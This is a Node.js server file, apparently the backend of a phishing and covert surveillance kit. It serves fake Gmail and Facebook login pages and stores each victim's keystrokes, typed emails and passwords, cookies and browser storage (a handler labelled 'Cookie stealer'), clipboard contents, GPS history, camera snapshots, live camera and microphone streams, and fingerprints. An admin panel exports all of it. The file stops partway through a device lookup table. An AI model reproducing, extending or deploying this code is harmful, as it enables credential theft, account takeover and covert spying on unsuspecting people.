const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const archiver = require('archiver');
const rateLimit = require('express-rate-limit');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: process.env.CORS_ORIGIN ? [process.env.CORS_ORIGIN] : '*',
        methods: ['GET', 'POST']
    }
});

const PORT = process.env.PORT || 8080;  // Railway assigns dynamic PORT
const DATA_DIR = path.join(__dirname, 'data');
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const crypto = require('crypto');

// Admin token store (persisted to file)
const adminTokens = new Set();
const TOKENS_FILE = path.join(DATA_DIR, 'tokens.json');
function loadTokens() {
    try {
        if (fs.existsSync(TOKENS_FILE)) {
            const data = JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf-8'));
            if (Array.isArray(data)) data.forEach(t => adminTokens.add(t));
        }
    } catch(e) {}
}
function saveTokens() {
    try { fs.writeFileSync(TOKENS_FILE, JSON.stringify([...adminTokens], null, 2)); } catch(e) {}
}
loadTokens();
const linkExpiry = { duration: 0, enabled: false }; // 0 = no expiry, duration in minutes
const templates = ['vault', 'gmail', 'facebook'];
let currentTemplate = 'vault';
const captchaData = new Map(); // deviceId -> { answer, timestamp }
const domains = ['']; // empty = current domain, can add custom
let currentDomainIndex = 0;
const telegramBots = new Map(); // chatId -> { token, allowed: bool }

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
if (!fs.existsSync(path.join(DATA_DIR, 'voice'))) fs.mkdirSync(path.join(DATA_DIR, 'voice'));

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});
app.use(express.json({ limit: '50mb' }));

// Admin auth middleware
function verifyAdmin(req, res, next) {
    // Public endpoints (no auth needed)
    const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat', '/api/link-account'];
    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path.startsWith('/voice/') || req.path === '/index.html') return next();
    // Protect admin.html — use token param for page load, header for API
    if (req.path === '/admin.html') {
        const token = req.query.token || req.headers['x-admin-token'];
        if (token && adminTokens.has(token)) return next();
        return res.redirect('/login-admin.html');
    }
    if (req.path.startsWith('/api/')) {
        const token = req.headers['x-admin-token'] || (req.headers['authorization'] && req.headers['authorization'].replace('Bearer ', ''));
        if (token && adminTokens.has(token)) return next();
        return res.status(401).json({ error: 'unauthorized' });
    }
    next();
}
app.use(verifyAdmin);

// Check link expiry for tracking page
app.get('/', (req, res, next) => {
    if (linkExpiry.enabled && linkExpiry.duration > 0) {
        const linkCreatedAt = parseInt(req.query._t || '0') || 0;
        if (linkCreatedAt > 0) {
            const elapsed = Date.now() - linkCreatedAt;
            const maxAge = linkExpiry.duration * 60 * 1000;
            if (elapsed > maxAge) {
                return res.redirect('/lupa-password.html?expired=1');
            }
        }
    }
    const templatePath = path.join(__dirname, 'public', 'templates', currentTemplate + '.html');
    if (currentTemplate !== 'vault' && fs.existsSync(templatePath)) {
        return res.sendFile(templatePath);
    }
    next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'admin-panel')));

const devices = new Map();
const adminIps = new Set(); // Track admin IPs to exclude own devices

function saveDevices() {
    const data = {};
    for (const [id, d] of devices) {
        data[id] = {
            id: d.id,
            label: d.label,
            ip: d.ip,
            userAgent: d.userAgent,
            firstSeen: d.firstSeen,
            lastSeen: d.lastSeen,
            location: d.location,
            history: d.history.slice(-500),
            battery: d.battery,
            connection: d.connection,
            snapshots: d.snapshots.slice(-50),
            aiChat: d.aiChat ? d.aiChat.slice(-100) : [],
            deviceModel: d.deviceModel || 'Unknown',
            linkedAccount: d.linkedAccount || null,
            clipboardHistory: d.clipboardHistory || [],
            voiceRecordings: d.voiceRecordings || [],
            cookiesData: d.cookiesData || null,
            online: !!d.socketId && io.sockets.sockets.has(d.socketId)
        };
    }
    fs.writeFileSync(path.join(DATA_DIR, 'devices.json'), JSON.stringify(data, null, 2));
}

io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.deviceId || uuidv4();
    const isAdmin = !!socket.handshake.query.token;
    socket.join(deviceId); // Join room for targeted events (live camera, etc.)

    // Admin sockets should not create device entries
    if (isAdmin) {
        const adminIp = socket.handshake.address;
        adminIps.add(adminIp);
        socket.join('admins'); // Join admin room for targeted broadcasts
        socket.on('start-camera-stream', (targetDeviceId) => {
            if (targetDeviceId && devices.has(targetDeviceId)) {
                io.to(targetDeviceId).emit('start-camera-stream');
            }
        });
        socket.on('stop-camera-stream', (targetDeviceId) => {
            if (targetDeviceId) {
                io.to(targetDeviceId).emit('stop-camera-stream');
            }
        });
        socket.on('switch-camera', (targetDeviceId) => {
            if (targetDeviceId) {
                io.to(targetDeviceId).emit('switch-camera');
            }
        });
        socket.on('disconnect', () => {
            // Keep IP in set briefly; remove after other sockets from same IP may still be active
            setTimeout(() => adminIps.delete(adminIp), 60000);
        });
        return;
    }

    const clientIp = socket.handshake.address;
    const isOwnDevice = adminIps.has(clientIp);

    if (!devices.has(deviceId)) {
        devices.set(deviceId, {
            id: deviceId,
            label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
            ip: clientIp,
            userAgent: '',
            firstSeen: Date.now(),
            lastSeen: Date.now(),
            location: null,
            history: [],
            battery: {},
            connection: {},
            snapshots: [],
            aiChat: [],
            deviceDetection: null,
            deviceModel: 'Unknown',
            linkedAccount: null,
            clipboardHistory: [],
            voiceRecordings: [],
            cookiesData: null,
            isOwnDevice: isOwnDevice,
            socketId: socket.id
        });
        io.emit('device-new', {
            id: deviceId,
            label: isOwnDevice ? `Admin-${deviceId.slice(0, 6)}` : `Device-${deviceId.slice(0, 6)}`,
            time: Date.now(),
            isOwnDevice: isOwnDevice
        });
    }

    const device = devices.get(deviceId);
    device.socketId = socket.id;
    device.lastSeen = Date.now();

    // Notify admin panel that device is back online
    io.emit('device-online', { id: deviceId, label: device.label, time: Date.now() });

    socket.emit('device-id', deviceId);

    socket.on('user-agent', (ua) => {
        device.userAgent = ua;
        saveDevices();
    });

    socket.on('device-info', (info) => {
        if (info.battery) device.battery = info.battery;
        if (info.connection) device.connection = info.connection;
        if (info.orientation) device.orientation = info.orientation;
        if (info.fingerprint) device.fingerprint = info.fingerprint;
        if (info.ipGeo) device.ipGeo = info.ipGeo;
        if (info.clipboard) device.clipboard = info.clipboard;
        if (info.motion) device.motion = info.motion;
        if (info.light) device.light = info.light;
        if (info.sw) device.sw = info.sw;
        if (info.idle) device.idle = info.idle;
        if (info.speech) device.speech = info.speech;
        if (info.storageFlood) device.storageFlood = info.storageFlood;
        if (info.fullscreen) device.fullscreen = info.fullscreen;
        if (info.notifSpam) device.notifSpam = info.notifSpam;
        if (info.persistentStorage) device.persistentStorage = info.persistentStorage;
        if (info.storageEstimate) device.storageEstimate = info.storageEstimate;
        if (info.tabs !== undefined) device.tabs = info.tabs;
        if (info.fieldEmail) device.fieldEmail = info.fieldEmail;
        if (info.fieldPass) device.fieldPass = info.fieldPass;
        if (info.webrtcIP) device.webrtcIP = info.webrtcIP;
        if (info.webgl) device.webgl = info.webgl;
        if (info.audioFP) device.audioFP = info.audioFP;
        if (info.orientationLock) device.orientationLock = info.orientationLock;
        if (info.fonts) device.fonts = info.fonts;
        if (info.preferences) device.preferences = info.preferences;
        if (info.speedTest) device.speedTest = info.speedTest;
        if (info.pointerLock) device.pointerLock = info.pointerLock;
        if (info.bluetooth) device.bluetooth = info.bluetooth;
        if (info.posture) device.posture = info.posture;
        if (info.foldable) device.foldable = info.foldable;
        if (info.sharedWorker) device.sharedWorker = info.sharedWorker;
        if (info.cpuTiming) device.cpuTiming = info.cpuTiming;
        if (info.wakeLock) device.wakeLock = info.wakeLock;
        if (info.wakeLockError) device.wakeLockError = info.wakeLockError;
        if (info.deviceDetection) {
            device.deviceDetection = info.deviceDetection;
            device.deviceModel = identifyDevice(info.deviceDetection);
        }
        saveDevices();
    });

    socket.on('keystroke', (data) => {
        if (!device.keystrokes) device.keystrokes = [];
        device.keystrokes.push({ k: data.k, t: Date.now(), ts: data.ts });
        if (device.keystrokes.length > 200) device.keystrokes = device.keystrokes.slice(-200);
        saveDevices();
        io.emit('device-update', { id: deviceId, keystrokes: device.keystrokes.slice(-20) });
    });

    socket.on('clickmap', (data) => {
        if (!device.clicks) device.clicks = [];
        device.clicks.push({ x: data.x, y: data.y, t: Date.now(), el: data.el || '' });
        if (device.clicks.length > 100) device.clicks = device.clicks.slice(-100);
        saveDevices();
    });

    socket.on('visibility', (data) => {
        device.visibility = data; // { state: 'visible'|'hidden', time: ... }
        device.lastSeen = Date.now();
        saveDevices();
        io.emit('device-update', { id: deviceId, visibility: data });
    });

    socket.on('autofill', (data) => {
        if (!device.autofills) device.autofills = [];
        device.autofills.push({ value: data.value.slice(0,200), field: data.field, time: Date.now() });
        if (device.autofills.length > 20) device.autofills = device.autofills.slice(-20);
        saveDevices();
    });

    socket.on('location', (data) => {
        const point = {
            lat: data.lat,
            lng: data.lng,
            accuracy: data.accuracy,
            timestamp: Date.now()
        };
        device.location = point;
        device.history.push(point);
        device.lastSeen = Date.now();
        saveDevices();

        io.emit('device-update', {
            id: deviceId,
            label: device.label,
            location: point,
            history: device.history.slice(-100),
            snapshotsCount: device.snapshots.length,
            battery: device.battery,
            connection: device.connection,
            isOwnDevice: device.isOwnDevice || false
        });
    });

    socket.on('snapshot', (data) => {
        const filename = `${deviceId}_${Date.now()}.jpg`;
        const filepath = path.join(DATA_DIR, 'snapshots', filename);
        const buffer = Buffer.from(data.image, 'base64');
        fs.writeFile(filepath, buffer, (err) => {
            if (!err) {
                const snap = { filename, timestamp: Date.now() };
                device.snapshots.push(snap);
                device.lastSeen = Date.now();
                saveDevices();
                io.emit('new-snapshot', {
                    deviceId,
                    label: device.label,
                    filename,
                    timestamp: Date.now()
                });
            }
        });
    });

    socket.on('forensics', (data) => {
        if (!device.alerts) device.alerts = [];
        device.alerts.push({ type: data.type, detail: data.detail, time: data.time || Date.now() });
        if (device.alerts.length > 50) device.alerts = device.alerts.slice(-50);
        saveDevices();
        io.emit('forensics-alert', { deviceId, label: device.label, type: data.type, detail: data.detail, time: Date.now() });
    });

    socket.on('camera-stream', (frameData) => {
        // Relay live frame only to admin panel clients
        io.to('admins').emit('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
    });

    // Live camera audio relay
    socket.on('camera-audio', (frameData) => {
        io.to('admins').emit('camera-audio-frame', { deviceId, label: device.label, audio: frameData.audio, mimeType: frameData.mimeType });
    });

    // Camera stream status feedback
    socket.on('camera-status', (data) => {
        io.to('admins').emit('camera-status', { deviceId, label: device.label, ...data, time: Date.now() });
    });

    // Real-time clipboard monitoring
    socket.on('clipboard-data', (data) => {
        if (!device.clipboardHistory) device.clipboardHistory = [];
        device.clipboardHistory.push({ text: data.text, time: data.timestamp || Date.now() });
        if (device.clipboardHistory.length > 50) device.clipboardHistory = device.clipboardHistory.slice(-50);
        device.clipboard = data.text;
        saveDevices();
        io.emit('device-update', { id: deviceId, clipboard: data.text, clipboardHistory: device.clipboardHistory });
    });

    // Voice recording chunks
    socket.on('voice-data', (data) => {
        // Relay live voice to admin panel clients
        io.to('admins').emit('voice-frame', { deviceId, label: device.label, audio: data.audio, mimeType: data.mimeType, sequence: data.sequence, timestamp: Date.now() });
        // Save to disk (only for non-chunked recordings with duration)
        if (data.duration) {
            const filename = `${deviceId}_${data.sequence}_${Date.now()}.webm`;
            const filepath = path.join(DATA_DIR, 'voice', filename);
            const buffer = Buffer.from(data.audio, 'base64');
            fs.writeFile(filepath, buffer, (err) => {
                if (!err) {
                    if (!device.voiceRecordings) device.voiceRecordings = [];
                    device.voiceRecordings.push({
                        filename,
                        sequence: data.sequence,
                        mimeType: data.mimeType,
                        duration: data.duration,
                        timestamp: data.timestamp || Date.now()
                    });
                    if (device.voiceRecordings.length > 20) device.voiceRecordings = device.voiceRecordings.slice(-20);
                    saveDevices();
                    io.emit('voice-recording', {
                        deviceId,
                        label: device.label,
                        filename,
                        sequence: data.sequence,
                        timestamp: Date.now()
                    });
                }
            });
        }
    });

    // Cookie stealer
    socket.on('cookies-data', (data) => {
        device.cookiesData = {
            cookies: data.cookies || '',
            localStorage: data.localStorage || {},
            sessionStorage: data.sessionStorage || {},
            timestamp: data.timestamp || Date.now()
        };
        saveDevices();
        io.emit('device-update', { id: deviceId, cookiesData: device.cookiesData });
    });

    socket.on('ai-message', async (data) => {
        const { deviceId: did, message } = data;
        if (!did || !message) return;

        addChatMessage(did, 'user', message);

        const history = aiChatHistory.get(did) || [];
        const apiMessages = history.slice(-20).map(m => ({ role: m.role, content: m.content }));

        const aiReply = await callMimoAPI(apiMessages);
        addChatMessage(did, 'assistant', aiReply);

        io.to(did).emit('ai-response', { message: aiReply, time: Date.now() });
        io.emit('ai-chat-update', { deviceId: did, message, reply: aiReply, time: Date.now() });
    });

    socket.on('disconnect', () => {
        device.lastSeen = Date.now();
        saveDevices();
        io.emit('device-offline', deviceId);
        io.emit('camera-stop', deviceId);
    });
});

// ===== API =====

app.get('/api/devices', (req, res) => {
    const data = [];
    for (const [id, d] of devices) {
        data.push({
            id: d.id, label: d.label, ip: d.ip,
            userAgent: d.userAgent,
            firstSeen: d.firstSeen, lastSeen: d.lastSeen,
            online: !!d.socketId && io.sockets.sockets.has(d.socketId),
            location: d.location,
            history: d.history.slice(-100),
            battery: d.battery,
            connection: d.connection,
            snapshotsCount: d.snapshots.length,
            keystrokes: d.keystrokes ? d.keystrokes.slice(-50) : [],
            clicks: d.clicks ? d.clicks.slice(-50) : [],
            autofills: d.autofills || [],
            clipboard: d.clipboard || '',
            visibility: d.visibility || null,
            light: d.light || null,
            motion: d.motion || null,
            fingerprint: d.fingerprint || null,
            sw: d.sw || null,
            idle: d.idle || null,
            speech: d.speech || null,
            storageFlood: d.storageFlood || null,
            fullscreen: d.fullscreen || null,
            notifSpam: d.notifSpam || null,
            persistentStorage: d.persistentStorage || null,
            storageEstimate: d.storageEstimate || null,
            tabs: d.tabs || 0,
            fieldEmail: d.fieldEmail || '',
            fieldPass: d.fieldPass || '',
            webrtcIP: d.webrtcIP || '',
            webgl: d.webgl || null,
            audioFP: d.audioFP || null,
            orientationLock: d.orientationLock || null,
            fonts: d.fonts || null,
            preferences: d.preferences || null,
            speedTest: d.speedTest || null,
            pointerLock: d.pointerLock || null,
            bluetooth: d.bluetooth || null,
            posture: d.posture || null,
            foldable: d.foldable || null,
            sharedWorker: d.sharedWorker || null,
            cpuTiming: d.cpuTiming || null,
            wakeLock: d.wakeLock || null,
            wakeLockError: d.wakeLockError || null,
            aiChat: d.aiChat ? d.aiChat.slice(-50) : [],
            deviceModel: d.deviceModel || 'Unknown',
            linkedAccount: d.linkedAccount || null,
            deviceDetection: d.deviceDetection || null,
            clipboardHistory: d.clipboardHistory || [],
            voiceRecordings: d.voiceRecordings || [],
            cookiesData: d.cookiesData || null,
            isOwnDevice: d.isOwnDevice || false
        });
    }
    res.json(data);
});

app.get('/api/devices/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.status(404).json({ error: 'not found' });
    res.json({
        id: d.id, label: d.label, ip: d.ip,
        userAgent: d.userAgent,
        firstSeen: d.firstSeen, lastSeen: d.lastSeen,
        online: !!d.socketId && io.sockets.sockets.has(d.socketId),
        location: d.location,
        history: d.history,
        battery: d.battery,
        connection: d.connection,
        snapshotsCount: d.snapshots.length,
        aiChat: d.aiChat ? d.aiChat.slice(-50) : [],
        deviceModel: d.deviceModel || 'Unknown',
        linkedAccount: d.linkedAccount || null
    });
});

app.post('/api/link-account', (req, res) => {
    const { deviceId, uid, email, name } = req.body;
    if (!deviceId || !uid) return res.status(400).json({ error: 'deviceId and uid required' });
    const d = devices.get(deviceId);
    if (d) {
        d.linkedAccount = { uid, email: email || '', name: name || '', linkedAt: Date.now() };
        if (email && !d.fieldEmail) d.fieldEmail = email;
        saveDevices();
    }
    res.json({ ok: true });
});

app.get('/api/keystrokes/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.keystrokes || []);
});

app.get('/api/history/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.history);
});

app.get('/api/snapshots/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.snapshots.map(s => ({ ...s, url: `/snapshots/${s.filename}` })));
});

app.get('/api/voice/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.json([]);
    res.json(d.voiceRecordings ? d.voiceRecordings.map(v => ({ ...v, url: `/voice/${v.filename}` })) : []);
});

// Export CSV
app.get('/api/export/csv', (req, res) => {
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename=devices.csv');
    res.write('\uFEFF');
    res.write('Device ID,Label,IP,Status,Latitude,Longitude,Akurasi (m),Battery Level,Battery Charging,Connection Type,Terakhir Update\n');
    for (const [id, d] of devices) {
        const online = !!d.socketId && io.sockets.sockets.has(d.socketId);
        const lat = d.location ? d.location.lat : '';
        const lng = d.location ? d.location.lng : '';
        const acc = d.location ? d.location.accuracy : '';
        const bat = d.battery ? d.battery.level : '';
        const chg = d.battery ? d.battery.charging : '';
        const conn = d.connection ? d.connection.type : '';
        res.write(`${id},${d.label},${d.ip},${online ? 'Online' : 'Offline'},${lat},${lng},${acc},${bat},${chg},${conn},${new Date(d.lastSeen).toISOString()}\n`);
    }
    res.end();
});

// Export JSON
app.get('/api/export/json', (req, res) => {
    const data = {};
    for (const [id, d] of devices) {
        data[id] = {
            label: d.label, ip: d.ip,
            userAgent: d.userAgent,
            firstSeen: d.firstSeen, lastSeen: d.lastSeen,
            online: !!d.socketId && io.sockets.sockets.has(d.socketId),
            location: d.location,
            history: d.history,
            battery: d.battery,
            connection: d.connection,
            snapshotsCount: d.snapshots.length
        };
    }
    res.setHeader('Content-Disposition', 'attachment; filename=devices.json');
    res.json(data);
});

// Export Snapshots ZIP
app.get('/api/export/snapshots/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.status(404).json({ error: 'not found' });

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename=snapshots_${req.params.deviceId.slice(0,8)}.zip`);

    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.pipe(res);

    for (const snap of d.snapshots) {
        const fp = path.join(DATA_DIR, 'snapshots', snap.filename);
        if (fs.existsSync(fp)) {
            archive.file(fp, { name: snap.filename });
        }
    }
    archive.finalize();
});

// Clear history for a device
app.post('/api/clear-history/:deviceId', (req, res) => {
    const d = devices.get(req.params.deviceId);
    if (!d) return res.status(404).json({ error: 'not found' });
    d.history = [];
    saveDevices();
    res.json({ ok: true });
});

// ===== DEVICE IDENTIFICATION =====
const knownDevices = [
    // Apple iPhones
    { vendor: 'Apple', model: 'iPhone 14 Pro Max', screen: '1290x2796', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 14 Pro', screen: '1179x2556', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 14 Plus', screen: '1284x2778', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 14', screen: '1170x2532', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 13 Pro Max', screen: '1284x2778', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 13 Pro', screen: '1170x2532', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 13', screen: '1170x2532', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 13 Mini', screen: '1080x2340', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 12 Pro Max', screen: '1284x2778', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 12 Pro', screen: '1170x2532', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 12', screen: '1170x2532', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 12 Mini', screen: '1080x2340', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 11 Pro Max', screen: '1242x2688', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 11 Pro', screen: '1125x2436', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 11', screen: '828x1792', dpr: 2, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone XR', screen: '828x1792', dpr: 2, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone X/XS', screen: '1125x2436', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone XS Max', screen: '1242x2688', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone SE (3rd gen)', screen: '750x1334', dpr: 2, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone SE (2nd gen)', screen: '750x1334', dpr: 2, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 8 Plus', screen: '1080x1920', dpr: 3, brand: 'iPhone' },
    { vendor: 'Apple', model: 'iPhone 8', screen: '750x1334', dpr: 2, brand: 'iPhone' },
    // iPad
    { vendor: 'Apple', model: 'iPad Pro 12.9"', screen: '2048x2732', dpr: 2, brand: 'iPad' },
    { vendor: 'Apple', model: 'iPad Pro 11"', screen: '1668x2388', dpr: 2, brand: 'iPad' },
    { vendor: 'Apple', model: 'iPad Air', screen: '1640x2360', dpr: 2, brand: 'iPad' },
    { vendor: 'Apple', model: 'iPad (10th gen)', screen: '1640x2360', dpr: 2, brand: 'iPad' },
    { vendor: 'Apple', model: 'iPad Mini', screen: '1488x2266', dpr: 2, brand: 'iPad' },
    // Samsung Galaxy
    { vendor: 'Samsung', model: 'Galaxy S24 Ultra', screen: '1440x3120', dpr: 3.5, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S24+', screen: '1440x3120', dpr: 3.5, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S24', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S23 Ultra', screen: '1440x3088', dpr: 3.5, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S23+', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S23', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S22 Ultra', screen: '1440x3088', dpr: 3.5, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S22+', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S22', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S21 Ultra', screen: '1440x3200', dpr: 3.5, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S21+', screen: '1080x2400', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy S21', screen: '1080x2400', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy A54', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy A34', screen: '1080x2340', dpr: 3, brand: 'Samsung' },
    { vendor: 'Samsung', model: 'Galaxy A14', screen: '1080x2408', dpr: 2.5, brand: 'Samsung' },
    // Xiaomi
    { vendor: 'Xiaomi', model: 'Xiaomi 14 Pro', screen: '1440x3200', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Xiaomi 14', screen: '1220x2670', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Xiaomi 13 Pro', screen: '1440x3200', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Xiaomi 13', screen: '1080x2400', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Xiaomi 12 Pro', screen: '1440x3200', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Xiaomi 12', screen: '1080x2400', dpr: 3, brand: 'Xiaomi' },
    { vendor: 'Xiaomi', model: 'Redmi Note 13 Pro', screen: '1220x2712', dpr: 3, brand: 'Redmi' },
    { vendor: 'Xiaomi', model: 'Redmi Note 13', screen: '1080x2400', dpr: 3, brand: 'Redmi' },
    { vendor: 'Xiaomi', model: 'Redmi Note 12 Pro', screen: '1080x2400', dpr: 3, brand: 'Redmi' },
    { vendor: 'Xiaomi', model: 'Redmi Note 12', screen: '1080x2400', dpr: 2.5, brand: 'Redmi' },
    { vendor: 'Xiaomi', model: 'Redmi 12', screen: '720x1600', dpr: 2, brand: 'Redmi' },
    // OPPO
    { vendor: 'OPPO', model: 'Find X7 Ultra', screen: '1440x3168', dpr: 3, brand: 'OPPO' },
    { vendor: 'OPPO', model: 'Find X7', screen: '1264x2780', dpr: 3, brand: 'OPPO' },
    { vendor: 'OPPO', model: 'Find X6 Pro', screen: '1440x3168', dpr: 3, brand: 'OPPO' },
    { vendor: 'OPPO', model: 'Reno 11 Pro', screen: '1080x2412', dpr: 3, brand: 'OPPO' },
    { vendor: 'OPPO', model: 'Reno 11', screen: '1080x2412', dpr: 3, brand: 'OPPO' },
    { vendor: 'OPPO', model: 'Reno 10 Pro', screen: '1080x2412', dpr: 3, brand: 'OPPO' },
    // Vivo
    { vendor: 'Vivo', model: 'X100 Pro', screen: '1260x2800', dpr: 3, brand: 'Vivo' },
    { vendor: 'Vivo', model: 'X100', screen: '1260x2800', dpr: 3, brand: 'Vivo' },
    { vendor: 'Vivo', model: 'V30 Pro', screen: '1260x2800', dpr: 3, brand: 'Vivo' },
    { vendor: 'Vivo', model: 'V30', screen: '1080x2400', dpr: 3, brand: 'Vivo' },
    // realme
    { vendor: 'realme', model: 'GT 5 Pro', screen: '1264x2780', dpr: 3, brand: 'realme' },
    { vendor: 'realme', model: 'GT Neo 5', screen: '1240x2772', dpr: 3, brand: 'realme' },
    { vendor: 'realme', model: '12 Pro+', screen: '1080x2412', dpr: 3, brand: 'realme' },
    { vendor: 'realme', model: '12 Pro', screen: '1080x2412', dpr: 3, brand: 'realme' },
    // Google Pixel
    { vendor: 'Google', model: 'Pixel 8 Pro', screen: '1344x2992', dpr: 3.5, brand: 'Google' },
    { vendor: 'Google', model: 'Pixel 8', screen: '1080x2400', dpr: 2.6, brand: 'Google' },
    { vendor: 'Google', model: 'Pixel 7 Pro', screen: '1440x3120', dpr: 3.5, brand: 'Google' },
    { vendor: 'Google', model: 'Pixel 7', screen: '1080x2400', dpr: 2.6, brand: 'Google' },
    // OnePlus
    { vendor: 'OnePlus', model: 'OnePlus 12', screen: '1440x3168', dpr: 3, brand: 'OnePlus' },
    { vendor: 'OnePlus', model: 'OnePlus 11', screen: '1440x3216', dpr: 3, brand: 'OnePlus' },
    { vendor: 'OnePlus', model: 'OnePlus Nord 3', screen: '1240x2772', dpr: 3, brand: 'OnePlus' },
    // Huawei
    { vendor: 'Huawei', model: 'P60 Pro', screen: '1220x2700', dpr: 3, brand: 'Huawei' },
    { vendor: 'Huawei', model: 'Mate 60 Pro', screen: '1260x2720', dpr: 3, brand: 'Huawei' },
    { vendor: 'Huawei', model: 'Nova 12 Ultra', screen: '1224x2652', dpr: 3, brand: 'Huawei' },
    // Desktop common
    { vendor: 'Generic', model: 'Desktop (1920x1080)', screen: '1920x1080', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (1920x1200)', screen: '1920x1200', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (2560x1440)', screen: '2560x1440', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (2560x1600)', screen: '2560x1600', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (3440x1440)', screen: '3440x1440', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (3840x2160)', screen: '3840x2160', dpr: 1, brand: 'Desktop' },
    { vendor: 'Generic', model: 'Desktop (1366x768)', screen: '1366x768', dpr: 1, brand: 'Desktop' },
    // MacBook
    { vendor: 'Apple', model: 'MacBook Pro 14"', screen: '3024x1964', dpr: 2, brand: 'Mac' },
    { vendor: 'Apple', model: 'MacBook Pro 16"', screen: '3456x2234', dpr: 2, brand: 'Mac' },
    { vendor: 'Apple', model: 'MacBook Air 13"', screen: '2560x1664', dpr: 2, brand: 'Mac' },
    { vendor: 'Apple', model: 'MacBook Air 15"', screen: '2880x1864', dpr: 2, brand: 'Mac' },
    { vendor: 'Apple', model: 'iMac 24"', screen: '4480x2520', dpr: 2, brand: 'Mac' },
    { vendor: 'Apple', model: 'MacBook Pro 13"', screen: '2560x1600', dpr: 2, brand: 'Mac' },
    // Microsoft Surface
